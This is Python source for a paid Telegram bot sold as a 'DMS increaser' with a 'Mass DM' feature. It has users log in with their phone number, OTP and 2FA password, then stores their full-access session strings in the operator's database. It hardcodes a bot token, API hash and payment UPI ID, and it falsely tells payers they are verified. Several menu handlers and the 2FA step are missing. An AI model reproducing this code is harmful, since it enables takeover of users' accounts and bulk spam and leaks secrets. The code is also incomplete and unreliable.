import os
import json
import sqlite3
import requests
import time
import asyncio
from threading import Thread
from flask import Flask
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

app = Flask('')

@app.route('/')
def home():
    return "Kunwar DMS Ultra Engine is Live!", 200

# ================== CONFIGURATION ==================
TOKEN = '8644302388:AAGRKZzOsnXUdVF4AnaWHQRI1OHQCDpSLj0'
URL = f'https://api.telegram.org/bot{TOKEN}/'
ADMIN_ID = 6752542323  

API_ID = 2040
API_HASH = 'b18441a1ff607e10a989891a5462e627'
# ===================================================

def init_db():
    conn = sqlite3.connect('bot_data.db', timeout=10)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (chat_id INTEGER PRIMARY KEY, is_premium INTEGER DEFAULT 0, expiry INTEGER DEFAULT 0)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS sessions (chat_id INTEGER, phone TEXT, session_str TEXT)''')
    conn.commit()
    conn.close()

    default_settings = {
        'upi_id': 'sapna513@ptaxis',
        'price_1d': '10', 'price_3d': '25', 'price_7d': '50', 'price_1m': '150', 'price_perm': '299'
    }
    conn = sqlite3.connect('bot_data.db', timeout=10)
    cursor = conn.cursor()
    for key, value in default_settings.items():
        cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

init_db()

def get_setting(key):
    conn = sqlite3.connect('bot_data.db', timeout=10)
    cursor = conn.cursor()
    cursor.execute("SELECT value FROM settings WHERE key=?", (key,))
    res = cursor.fetchone()
    conn.close()
    return res[0] if res else "Not Set"

def set_setting(key, value):
    conn = sqlite3.connect('bot_data.db', timeout=10)
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def check_premium(chat_id):
    if int(chat_id) == int(ADMIN_ID): 
        return True
    conn = sqlite3.connect('bot_data.db', timeout=10)
    cursor = conn.cursor()
    cursor.execute("SELECT is_premium, expiry FROM users WHERE chat_id=?", (int(chat_id),))
    res = cursor.fetchone()
    conn.close()
    if res:
        is_prem, expiry = res
        if int(is_prem) == 1 and int(expiry) > int(time.time()):
            return True
    return False

def make_premium(chat_id, days):
    expiry = int(time.time()) + (int(days) * 86400) if int(days) < 999 else int(time.time()) + (9999 * 86400)
    conn = sqlite3.connect('bot_data.db', timeout=10)
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO users (chat_id, is_premium, expiry) VALUES (?, 1, ?)", (int(chat_id), expiry))
    conn.commit()
    conn.close()

def get_main_menu():
    return {"inline_keyboard": [
        [{"text": "➕ Add Session", "callback_data": "add_session"}, {"text": "🚀 Start Mass DM", "callback_data": "start_dm"}],
        [{"text": "📊 Check Progress", "callback_data": "check_progress"}, {"text": "💎 Premium Plans", "callback_data": "premium_plans"}],
        [{"text": "🗑️ Logout Session", "callback_data": "logout_session"}, {"text": "📞 Support", "callback_data": "support"}]
    ]}

def get_premium_menu():
    return {"inline_keyboard": [
        [{"text": f"1 Day — ₹{get_setting('price_1d')}", "callback_data": "pay_1d"}],
        [{"text": f"3 Days — ₹{get_setting('price_3d')}", "callback_data": "pay_3d"}],
        [{"text": f"7 Days — ₹{get_setting('price_7d')}", "callback_data": "pay_7d"}],
        [{"text": f"1 Month — ₹{get_setting('price_1m')}", "callback_data": "pay_1m"}],
        [{"text": f"Permanent — ₹{get_setting('price_perm')}", "callback_data": "pay_perm"}],
        [{"text": "⬅️ Back to Menu", "callback_data": "back_to_menu"}]
    ]}

user_states = {}
active_clients = {}
payment_tracking = {}

def send_tg_msg(chat_id, text, reply_markup=None):
    data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}
    if reply_markup: data['reply_markup'] = json.dumps(reply_markup)
    return requests.post(URL + 'sendMessage', json=data).json()

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try: return loop.run_until_complete(coro)
    finally: loop.close()

async def init_telethon_login(chat_id, phone):
    session_name = f"session_{chat_id}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    try:
        send_code = await client.send_code_request(phone)
        active_clients[chat_id] = {'client': client, 'phone': phone, 'phone_code_hash': send_code.phone_code_hash}
        user_states[chat_id] = 'expecting_otp'
        send_tg_msg(chat_id, "📩 **OTP Sent!** Please check your Telegram app and enter it here:")
    except Exception as e:
        send_tg_msg(chat_id, f"❌ Failed: {str(e)}")
        user_states.pop(chat_id, None)
        await client.disconnect()

async def verify_telethon_otp(chat_id, otp):
    data = active_clients.get(chat_id)
    if not data: return
    client = data['client']
    try:
        await client.sign_in(data['phone'], code=otp, phone_code_hash=data['phone_code_hash'])
        from telethon.sessions import StringSession
        string_session = StringSession.save(client.session)
        conn = sqlite3.connect('bot_data.db', timeout=10)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO sessions (chat_id, phone, session_str) VALUES (?, ?, ?)", (chat_id, data['phone'], str(string_session)))
        conn.commit()
        conn.close()
        send_tg_msg(chat_id, f"✅ **Session Linked Successfully!**")
        user_states.pop(chat_id, None)
    except SessionPasswordNeededError:
        user_states[chat_id] = 'expecting_2fa'
        send_tg_msg(chat_id, "🔒 **Enter 2FA Password:**")
    except Exception as e:
        send_tg_msg(chat_id, f"❌ Failed: {str(e)}")
    finally:
        if user_states.get(chat_id) != 'expecting_2fa': await client.disconnect()

def process_update(update):
    try:
        if "message" in update:
            msg = update["message"]
            chat_id = msg["chat"]["id"]
            
            if "text" in msg:
                text = msg["text"]
                if text == "/start":
                    user_states.pop(chat_id, None)
                    send_tg_msg(chat_id, "✨ *KUNWAR DMS INCREASER* ✨\n\nChoose an option below.", get_main_menu())
                    return

                if text == "/admin" and int(chat_id) == int(ADMIN_ID):
                    send_tg_msg(chat_id, f"⚙️ *Admin Panel*\n\n/approve [User_ID] [Days]\n/setupupi [ID]")
                    return
                elif text.startswith("/approve ") and int(chat_id) == int(ADMIN_ID):
                    parts = text.split(" ")
                    target_user = parts[1].strip()
                    target_days = parts[2].strip()
                    make_premium(target_user, target_days)
                    send_tg_msg(ADMIN_ID, f"✅ Approved ID `{target_user}`")
                    send_tg_msg(int(target_user), f"🎉 **Premium Activated!** Admin approved your account.")
                    return
                elif text.startswith("/setupupi ") and int(chat_id) == int(ADMIN_ID):
                    set_setting('upi_id', text.split(" ", 1)[1])
                    send_tg_msg(chat_id, f"✅ UPI updated.")
                    return

                if chat_id in user_states:
                    state = user_states[chat_id]
                    if state == 'expecting_phone':
                        run_async(init_telethon_login(chat_id, text.strip()))
                        return
                    elif state == 'expecting_otp':
                        run_async(verify_telethon_otp(chat_id, text.strip()))
                        return
                    elif state == 'expecting_utr':
                        payment_tracking[chat_id]['utr'] = text.strip()
                        user_states[chat_id] = 'expecting_screenshot'
                        send_tg_msg(chat_id, "⏳ **UTR Saved!** Now please send/upload the **Payment Screenshot** here:")
                        return

            if "photo" in msg and chat_id in user_states and user_states[chat_id] == 'expecting_screenshot':
                photo_file_id = msg["photo"][-1]["file_id"]
                plan_data = payment_tracking.get(chat_id, {})
                plan_name = plan_data.get('plan', 'UNKNOWN')
                utr_number = plan_data.get('utr', 'NOT_PROVIDED')
                
                user_states.pop(chat_id, None)
                send_tg_msg(chat_id, "✅ Your details successful verified wait for admin approval")
                
                admin_caption = f"🔔 **NEW PREMIUM APPROVAL REQUEST**\n\n👤 **User ID:** `{chat_id}`\n📦 **Plan:** {plan_name.upper()}\n🔢 **UTR:** `{utr_number}`\n\n⚠️ *Copy-paste command to approve:*\n`/approve {chat_id} 30`"
                requests.post(URL + 'sendPhoto', json={'chat_id': ADMIN_ID, 'photo': photo_file_id, 'caption': admin_caption, 'parse_mode': 'Markdown'})
                return

        elif "callback_query" in update:
            cq = update["callback_query"]
            chat_id = cq["message"]["chat"]["id"]
            msg_id = cq["message"]["message_id"]
            data = cq["data"]

            if data == "premium_plans":
                requests.post(URL + 'editMessageText', json={'chat_id': chat_id, 'message_id': msg_id, 'text': "💎 *Premium Plans*", 'parse_mode': 'Markdown', 'reply_markup': get_premium_menu()})
            elif data.startswith("pay_"):
                plan_type = data.split("_")[1]
                pay_text = f"💳 **UPI ID:** `{get_setting('upi_id')}`\nAmount: ₹{get_setting(f'price_{plan_type}')}\n\nClick **PAID ✅** after transfer."
                requests.post(URL + 'editMessageText', json={'chat_id': chat_id, 'message_id': msg_id, 'text': pay_text, 'parse_mode': 'Markdown', 'reply_markup': {"inline_keyboard": [[{"text": "PAID ✅", "callback_data": f"confirm_paid_{plan_type}"}]]}})
            elif data.startswith("confirm_paid_"):
                plan = data.split("_")[2]
                payment_tracking[chat_id] = {'plan': plan}
                user_states[chat_id] = 'expecting_utr'
                requests.post(URL + 'deleteMessage', json={'chat_id': chat_id, 'message_id': msg_id})
                send_tg_msg(chat_id, "✍️ Please enter your **12-digit UTR Number**:")
            elif data == "add_session":
                if not check_premium(chat_id):
                    send_tg_msg(chat_id, "❌ **Access Denied!** Buy Premium subscription first.")
                    return
                send_tg_msg(chat_id, "📱 Enter phone number with country code:")
                user_states[chat_id] = 'expecting_phone'
    except Exception as e:
        pass

def run_bot_loop():
    requests.get(URL + 'deleteWebhook')
    offset = 0
    while True:
        try:
            r = requests.get(URL + 'getUpdates', params={'offset': offset, 'timeout': 5}).json()
            if "result" in r:
                for update in r["result"]:
                    offset = update["update_id"] + 1
                    process_update(update)
        except: pass
        time.sleep(1)

if __name__ == '__main__':
    Thread(target=run_bot_loop).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
